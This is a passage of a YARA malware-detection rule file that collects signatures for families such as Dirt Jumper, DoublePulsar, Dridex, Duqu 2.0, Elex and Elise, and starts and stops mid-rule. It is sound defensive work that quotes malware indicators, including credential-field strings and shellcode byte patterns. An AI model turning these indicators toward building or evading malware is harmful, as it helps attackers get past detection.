fullword\n        $cmd6 = \"-udp\" fullword\n        $str1 = \"login=[1000]&pass=[1000]&password=[50]&log=[50]&passwrd=[50]&user=[50]&username=[50]&vb_login_username=[50]&vb_login_md5password=[50]\"\n        $str2 = \"-timeout\" fullword\n        $str3 = \"-thread\" fullword\n        $str4 = \" Local; ru) Presto/2.10.289 Version/\"\n        $str5 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT\"\n        $newver1 = \"-icmp\"\n        $newver2 = \"<xmp>\"\n\n    condition:\n        4 of ($cmd*) and all of ($str*) and not any of ($newver*)\n}\n\nrule DirtJumper_drive2\n{\n    meta:\n        description = \"Dirt Jumper bot\"\n        classifications = \"Bot\"\n        threat_names = \"Dirt Jumper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jason Jones <jasonjones@arbor.net>\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"DirtJumper_drive2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $cmd1 = \"-get\" fullword\n        $cmd2 = \"-ip\" fullword\n        $cmd3 = \"-ip2\" fullword\n        $cmd4 = \"-post1\" fullword\n        $cmd5 = \"-post2\" fullword\n        $cmd6 = \"-udp\" fullword\n        $str1 = \"login=[1000]&pass=[1000]&password=[50]&log=[50]&passwrd=[50]&user=[50]&username=[50]&vb_login_username=[50]&vb_login_md5password=[50]\"\n        $str2 = \"-timeout\" fullword\n        $str3 = \"-thread\" fullword\n        $str4 = \" Local; ru) Presto/2.10.289 Version/\"\n        $str5 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT\"\n        $newver1 = \"-icmp\"\n        $newver2 = \"-byte\"\n        $newver3 = \"-long\"\n        $newver4 = \"<xmp>\"\n\n    condition:\n        4 of ($cmd*) and all of ($str*) and all of ($newver*)\n}\n\nrule DirtJumper_drive3\n{\n    meta:\n        description = \"Dirt Jumper bot\"\n        classifications = \"Bot\"\n        threat_names = \"Dirt Jumper\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jason Jones <jasonjones@arbor.net>\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"DirtJumper_drive3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $cmd1 = \"-get\" fullword\n        $cmd2 = \"-ip\" fullword\n        $cmd3 = \"-ip2\" fullword\n        $cmd4 = \"-post1\" fullword\n        $cmd5 = \"-post2\" fullword\n        $cmd6 = \"-udp\" fullword\n        $str1 = \"login=[1000]&pass=[1000]&password=[50]&log=[50]&passwrd=[50]&user=[50]&username=[50]&vb_login_username=[50]&vb_login_md5password=[50]\"\n        $str2 = \"-timeout\" fullword\n        $str3 = \"-thread\" fullword\n        $str4 = \" Local; ru) Presto/2.10.289 Version/\"\n        $str5 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT\"\n        $newver1 = \"-icmp\"\n        $newver2 = \"-byte\"\n        $newver3 = \"-long\"\n        $drive3 = \"99=1\"\n\n    condition:\n        4 of ($cmd*) and all of ($str*) and all of ($newver*) and $drive3\n}\n\nrule DoublePulsarXor_Petya\n{\n    meta:\n        description = \"DoublePulsar backdoor XORed shellcode\"\n        ref = \"https://www.boozallen.com/content/dam/boozallen_site/sig/pdf/white-paper/rollup-of-booz-allen-petya-research.pdf, https://www.boozallen.com/s/insight/publication/the-petya-ransomware-outbreak.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"DoublePulsar\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Patrick Jones\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"DoublePulsarXor_Petya\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $DoublePulsarXor_Petya = { FD 0C 8C 5C B8 C4 24 C5 CC CC CC 0E E8 CC 24 6B CC CC CC 0F 24 CD CC CC CC 27 5C 97 75 BA CD CC CC C3 FE }\n\n    condition:\n        $DoublePulsarXor_Petya\n}\n\nrule DoublePulsarDllInjection_Petya\n{\n    meta:\n        description = \"DoublePulsar backdoor XORed DLL injection shellcode\"\n        ref = \"https://www.boozallen.com/content/dam/boozallen_site/sig/pdf/white-paper/rollup-of-booz-allen-petya-research.pdf, https://www.boozallen.com/s/insight/publication/the-petya-ransomware-outbreak.html\"\n        classifications = \"Backdoor\"\n        threat_names = \"DoublePulsar\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Patrick Jones\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"DoublePulsarDllInjection_Petya\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $DoublePulsarDllInjection_Petya = { 45 20 8D 93 8D 92 8D 91 8D 90 92 93 91 97 0F 9F 9E 9D 99 84 45 29 84 4D 20 CC CD CC CC 9B 84 45 03 84 45 14 84 45 49 CC 33 33 33 24 77 CC CC CC 84 45 49 C4 33 33 33 24 84 CD CC CC 84 45 49 DC 33 33 33 84 47 49 CC 33 33 33 84 47 41 }\n\n    condition:\n        $DoublePulsarDllInjection_Petya\n}\n\nrule Dridex_Trojan_XML\n{\n    meta:\n        description = \"Dridex banking trojan in XML document\"\n        ref = \"https://threatpost.com/dridex-banking-trojan-spreading-via-macros-in-xml-files/111503\"\n        classifications = \"Spyware\"\n        threat_names = \"Dridex\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @4nc4p\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Dridex_Trojan_XML\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $c_xml = \"<?xml version=\"\n        $c_word = \"<?mso-application progid=\\\"Word.Document\\\"?>\"\n        $c_macro = \"w:macrosPresent=\\\"yes\\\"\"\n        $c_binary = \"<w:binData w:name=\"\n        $c_0_chars = \"<o:Characters>0</o:Characters>\"\n        $c_1_line = \"<o:Lines>1</o:Lines>\"\n\n    condition:\n        all of ($c*)\n}\n\nrule Duqu2_loaders\n{\n    meta:\n        description = \"Duqu 2.0 malware\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Duqu 2.0\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_duqu2_loaders\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"{AAFFC4F0-E04B-4C7C-B40A-B45DE971E81E}\" wide\n        $a2 = \"\\\\\\\\.\\\\pipe\\\\{AAFFC4F0-E04B-4C7C-B40A-B45DE971E81E}\" wide\n        $a4 = \"\\\\\\\\.\\\\pipe\\\\{AB6172ED-8105-4996-9D2A-597B5F827501}\" wide\n        $a5 = \"Global\\\\{B54E3268-DE1E-4c1e-A667-2596751403AD}\" wide\n        $a8 = \"SELECT `Data` FROM `Binary` WHERE `Name`='%s%i'\" wide\n        $a9 = \"SELECT `Data` FROM `Binary` WHERE `Name`='CryptHash%i'\" wide\n        $a7 = \"SELECT `%s` FROM `%s` WHERE `%s`='CAData%i'\" wide\n        $b1 = \"MSI.dll\"\n        $b2 = \"msi.dll\"\n        $b3 = \"StartAction\"\n        $c1 = \"msisvc_32@\" wide\n        $c2 = \"PROP=\" wide\n        $c3 = \"-Embedding\" wide\n        $c4 = \"S:(ML;;NW;;;LW)\" wide\n        $d1 = \"NameTypeBinaryDataCustomActionActionSourceTargetInstallExecuteSequenceConditionSequencePropertyValueMicrosoftManufacturer\" nocase\n        $d2 = {2E 3F 41 56 3F 24 5F 42 69 6E 64 40 24 30 30 58 55 3F 24 5F 50 6D 66 5F 77 72 61 70 40 50 38 43 4C 52 ?? 40 40 41 45 58 58 5A 58 56 31 40 24 24 24 56 40 73 74 64 40 40 51 41 56 43 4C 52 ?? 40 40 40 73 74 64 40 40}\n\n    condition:\n        ((uint16(0) == 0x5a4d) and ((any of ($a*)) or (all of ($b*)) or (all of ($c*))) and filesize < 100000) or ((uint32(0) == 0xe011cfd0) and ((any of ($a*)) or (all of ($b*)) or (all of ($c*)) or (any of ($d*))) and filesize < 20000000)\n}\n\nrule Duqu2_drivers\n{\n    meta:\n        description = \"Duqu 2.0 malware drivers\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Duqu 2.0\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_duqu2_drivers\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"\\\\DosDevices\\\\port_optimizer\" wide nocase\n        $a2 = \"romanian.antihacker\"\n        $a3 = \"PortOptimizerTermSrv\" wide\n        $a4 = \"ugly.gorilla1\"\n        $b1 = \"NdisIMCopySendCompletePerPacketInfo\"\n        $b2 = \"NdisReEnumerateProtocolBindings\"\n        $b3 = \"NdisOpenProtocolConfiguration\"\n\n    condition:\n        uint16(0) == 0x5A4D and (any of ($a*)) and (2 of ($b*)) and filesize < 100000\n}\n\nrule Duqu2_Generic1\n{\n    meta:\n        description = \"Duqu 2.0 malware\"\n        ref = \"https://goo.gl/7yKyOj\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Duqu 2.0\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Duqu2_Generic1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"Global\\\\{B54E3268-DE1E-4c1e-A667-2596751403AD}\" fullword wide\n        $s1 = \"SetSecurityDescriptorSacl\" fullword ascii\n        $s2 = \"msisvc_32@\" fullword wide\n        $s3 = \"CompareStringA\" fullword ascii\n        $s4 = \"GetCommandLineW\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 150KB and all of them\n}\n\nrule Duqu2_procexp\n{\n    meta:\n        description = \"Duqu 2.0 malware\"\n        ref = \"https://goo.gl/7yKyOj\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Duqu 2.0\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Kaspersky_Duqu2_procexp\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"svcmsi_32.dll\" fullword wide\n        $x2 = \"msi3_32.dll\" fullword wide\n        $x3 = \"msi4_32.dll\" fullword wide\n        $x4 = \"MSI.dll\" fullword ascii\n        $s1 = \"SELECT `Data` FROM `Binary` WHERE `Name`='%s%i'\" fullword wide\n        $s2 = \"Sysinternals installer\" fullword wide\n        $s3 = \"Process Explorer\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and (1 of ($x*)) and (all of ($s*))\n}\n\nrule Duqu2_SamsungPrint\n{\n    meta:\n        description = \"Duqu 2.0 malware\"\n        ref = \"https://goo.gl/7yKyOj\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Duqu 2.0\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Kaspersky_Duqu2_SamsungPrint\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"Installer for printer drivers and applications\" fullword wide\n        $s1 = \"msi4_32.dll\" fullword wide\n        $s2 = \"HASHVAL\" fullword wide\n        $s3 = \"SELECT `%s` FROM `%s` WHERE `%s`='CAData%i'\" fullword wide\n        $s4 = \"ca.dll\" fullword ascii\n        $s5 = \"Samsung Electronics Co., Ltd.\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 82KB and all of them\n}\n\nrule Duqu2_msi3_32\n{\n    meta:\n        description = \"Duqu 2.0 malware\"\n        ref = \"https://goo.gl/7yKyOj\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Duqu 2.0\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"APT_Kaspersky_Duqu2_msi3_32\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"ProcessUserAccounts\" fullword ascii\n        $s1 = \"SELECT `UserName`, `Password`, `Attributes` FROM `CustomUserAccounts`\" fullword wide\n        $s2 = \"SELECT `UserName` FROM `CustomUserAccounts`\" fullword wide\n        $s3 = \"SELECT `Data` FROM `Binary` WHERE `Name`='CryptHash%i'\" fullword wide\n        $s4 = \"msi3_32.dll\" fullword wide\n        $s5 = \"RunDLL\" fullword ascii\n        $s6 = \"MSI Custom Action v3\" fullword wide\n        $s7 = \"msi3_32\" fullword wide\n        $s8 = \"Operating System\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 72KB and all of them\n}\n\nrule Duqu2_Sample1\n{\n    meta:\n        description = \"Duqu 2.0 malware\"\n        ref = \"https://securelist.com/blog/research/70504/the-mystery-of-duqu-2-0-a-sophisticated-cyberespionage-actor-returns/\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Duqu 2.0\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Duqu2_Sample1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"SELECT `Data` FROM `Binary` WHERE `Name`='%s%i'\" fullword wide\n        $s2 = \"MSI.dll\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 40KB and $x1) or (all of them)\n}\n\nrule Duqu2_Sample2\n{\n    meta:\n        description = \"Duqu 2.0 malware\"\n        ref = \"https://securelist.com/blog/research/70504/the-mystery-of-duqu-2-0-a-sophisticated-cyberespionage-actor-returns/\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Duqu 2.0\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Duqu2_Sample2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"=<=Q=W=a=g=p=v=|=\" fullword ascii\n        $s2 = \">#>(>.>3>=>]>d>p>\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 50KB and all of ($s*)\n}\n\nrule Duqu2_Sample3\n{\n    meta:\n        description = \"Duqu 2.0 malware\"\n        ref = \"https://securelist.com/blog/research/70504/the-mystery-of-duqu-2-0-a-sophisticated-cyberespionage-actor-returns/\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Duqu 2.0\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Duqu2_Sample3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"SELECT `%s` FROM `%s` WHERE `%s`='CAData%i'\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 50KB and $s1)\n}\n\nrule Duqu2_Sample4\n{\n    meta:\n        description = \"Duqu 2.0 malware\"\n        ref = \"https://securelist.com/blog/research/70504/the-mystery-of-duqu-2-0-a-sophisticated-cyberespionage-actor-returns/\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Duqu 2.0\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Duqu2_Sample4\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"SELECT `Data` FROM `Binary` WHERE `Name`='CryptHash%i'\" fullword wide\n        $s2 = \"SELECT `UserName`, `Password`, `Attributes` FROM `CustomUserAccounts`\" fullword wide\n        $s3 = \"SELECT `UserName` FROM `CustomUserAccounts`\" fullword wide\n        $s4 = \"ProcessUserAccounts\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 30KB and 1 of ($x*)) or (all of them)\n}\n\nrule Duqu2_UAs\n{\n    meta:\n        description = \"Duqu 2.0 malware user agents\"\n        ref = \"https://securelist.com/blog/research/70504/the-mystery-of-duqu-2-0-a-sophisticated-cyberespionage-actor-returns/\"\n        classifications = \"Spyware, Rootkit\"\n        threat_names = \"Duqu 2.0\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Duqu2_UAs\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Mozilla/5.0 (Windows NT 6.1; U; ru; rv:5.0.1.6) Gecko/20110501 Firefox/5.0.1 Firefox/5.0.1\" fullword wide\n        $x2 = \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7xs5D9rRDFpg2g\" fullword wide\n        $x3 = \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; FDM; .NET CLR 1.1.4322)\" fullword wide\n        $x4 = \"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110612 Firefox/6.0a2\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 800KB and all of them)\n}\n\nrule Elex_Installer_NSIS\n{\n    meta:\n        description = \"Elex adware NSIS installer\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        classifications = \"Trojan, Adware\"\n        threat_names = \"Elex\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Trj_Elex_Installer_NSIS\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = {4e 75 6c 6c 73 6f 66 74 }\n        $str2 = {b7 a2 d5 dc 0c d6 a6 3a}\n\n    condition:\n        uint16(0) == 0x5a4d and ($str1 at 0xA008) and ($str2 at 0x1c8700)\n}\n\nrule Elex_Installer\n{\n    meta:\n        description = \"Elex adware installer\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        classifications = \"Trojan, Adware\"\n        threat_names = \"Elex\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Trj_Elex_Installer\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = {65 00 76 00 65 00 72 00 79 00 74 00 68 00 69 00 6e 00 67 00}\n        $str2 = \"IsWow64Process\"\n        $str3 = \"SSFK\"\n\n    condition:\n        uint16(0) == 0x5a4d and ($str1) and ($str2) and ($str3)\n}\n\nrule Elex_Service32\n{\n    meta:\n        description = \"Elex adware 32-bit service\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        classifications = \"Trojan, Adware\"\n        threat_names = \"Elex\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Trj_Elex_Service32\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"http://xa.xingcloud.com/v4/sof-everything/\"\n        $str2 = \"http://www.mysearch123.com\"\n        $str3 = \"21e223b3f0c97db3c281da1g7zccaefozzjcktmlma\"\n\n    condition:\n        uint16(0) == 0x5a4d and (pe.machine == pe.MACHINE_I386) and ($str1) and ($str2) and ($str3)\n}\n\nrule Elex_Service64\n{\n    meta:\n        description = \"Elex adware 64-bit service\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        classifications = \"Trojan, Adware\"\n        threat_names = \"Elex\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Trj_Elex_Service64\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"http://xa.xingcloud.com/v4/sof-everything/\"\n        $str2 = \"http://www.mysearch123.com\"\n        $str3 = \"21e223b3f0c97db3c281da1g7zccaefozzjcktmlma\"\n\n    condition:\n        uint16(0) == 0x5a4d and (pe.machine == pe.MACHINE_AMD64) and ($str1) and ($str2) and ($str3)\n}\n\nrule Elex_Dll32\n{\n    meta:\n        description = \"Elex adware 32-bit DLL\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        classifications = \"Trojan, Adware\"\n        threat_names = \"Elex\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Trj_Elex_Dll32\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = {59 00 72 00 72 00 65 00 68 00 73 00}\n        $str2 = \"RookIE/1.0\"\n\n    condition:\n        uint16(0) == 0x5a4d and (pe.machine == pe.MACHINE_I386) and (pe.characteristics & pe.DLL) and ($str1) and ($str2)\n}\n\nrule Elex_Dll64\n{\n    meta:\n        description = \"Elex adware 64-bit DLL\"\n        ref = \"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n        classifications = \"Trojan, Adware\"\n        threat_names = \"Elex\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Trj_Elex_Dll64\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = {59 00 72 00 72 00 65 00 68 00 73 00}\n        $str2 = \"RookIE/1.0\"\n\n    condition:\n        uint16(0) == 0x5a4d and (pe.machine == pe.MACHINE_AMD64) and (pe.characteristics & pe.DLL) and ($str1) and ($str2)\n}\n\nrule EliseLotusBlossom\n{\n    meta:\n        description = \"Elise backdoor trojan\"\n        ref = \"https://www.paloaltonetworks.com/resources/research/unit42-operation-lotus-blossom.html\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Elise\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jose Ramon Palanco\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EliseLotusBlossom\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"\\\",Update\" wide\n        $s2 = \"LoaderDLL.dll\"\n        $s3 = \"Kernel32.dll\"\n        $s4 = \"{5947BACD-63BF-4e73-95D7-0C8A98AB95F2}\"\n        $s5 = \"\\\\Network\\\\\" wide\n        $s6 = \"0SSSSS\"\n        $s7 = \"441202100205\"\n        $s8 = \"0WWWWW\"\n\n    condition:\n        uint16(0) == 0x5a4d and all of ($s*)\n}\n\nrule elise\n{\n    meta:\n        description = \"Elise backdoor trojan\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Elise\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Brian Wallace @botnet_hunter\"\n        source = \"https://github.com/bwall/bamfdetect\"\n        original_name = \"elise\"\n        license = \"MIT (https://opensource.org/licenses/MIT)\"\n\n    strings:\n        $a1 = \"Mozilla/4.0 (compatible; MSIE 8.0)\" wide\n        $a2 = \"KERNEL32.DLL\" wide\n        $a3 = \"Content-Length: 0\" wide\n        $a4 = \"/%x/page_%02d%02d%02d%02d.html\" wide\n        $a5 = \"%s=;expires=Thu, 01-Jan-1970 00:00:01 GMT\"\n        $a6 = \"000ELISEA380.TMP\"\n\n    condition:\n        all of them\n}\n\nrule Elise_Jan18_1\n{\n    meta:\n        description = \"Elise backdoor trojan fake Norton Security NavShExt.dll\"\n        ref = \"https://twitter.com/blu3_team/status/955971742329135105\"\n        classifications = \"Trojan, Backdoor\"\n        threat_names = \"Elise\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Elise_Jan18_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"NavShExt.dll\" fullword wide\n        $s2 = \"Norton Security\" fullword wide\n        $a1 = \"donotbotherme\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 250KB and (pe.imphash() == \"e9478ee4ebf085d1f14f64ba96ef082f\" or (1 of ($s*) and $a1))\n}\n\nrule elknot_xor : malware\n{\n    meta:\n        description = \"Elknot / BillGates bot\"\n        ref = \"http://liuya0904.blogspot.tw/2016/04/new-elknotbillgates-variant-with-xor.html\"\n        classifications = \"Bot\"\n        threat_names = \"Elknot\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"liuya@360.cn\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"elknot_xor\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $decrypt_c2_func_1 = {08 83 [5] 02 75 07 81 04 24 00 01 00 00 50 e8 [4] e9}\n        $decrypt_c2_func_2 = {e8 00 00 00 00 87 [2] 83 eb 05 8d 83 [4] 83 bb [4] 02 75 05}\n\n    condition:\n        1 of ($decrypt_c2_func_*)\n}\n\nrule Emdivi_SFX\n{\n    meta:\n        description = \"Emdivi malware in SFX archive\"\n        ref = \"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/\"\n        classifications = \"Backdoor\"\n        threat_names = \"Emdivi\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth @Cyber0ps\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Emdivi_SFX\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Setup=unsecess.exe\" fullword ascii\n        $x2 = \"Setup=leassnp.exe\" fullword ascii\n        $s1 = \"&Enter password for the encrypted file:\" fullword wide\n        $s2 = \";The comment below contains SFX script commands\" fullword ascii\n        $s3 = \"Path=%temp%\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 740KB and (1 of ($x*) and all of ($s*))\n}\n\nrule Emdivi_Gen1\n{\n    meta:\n        description = 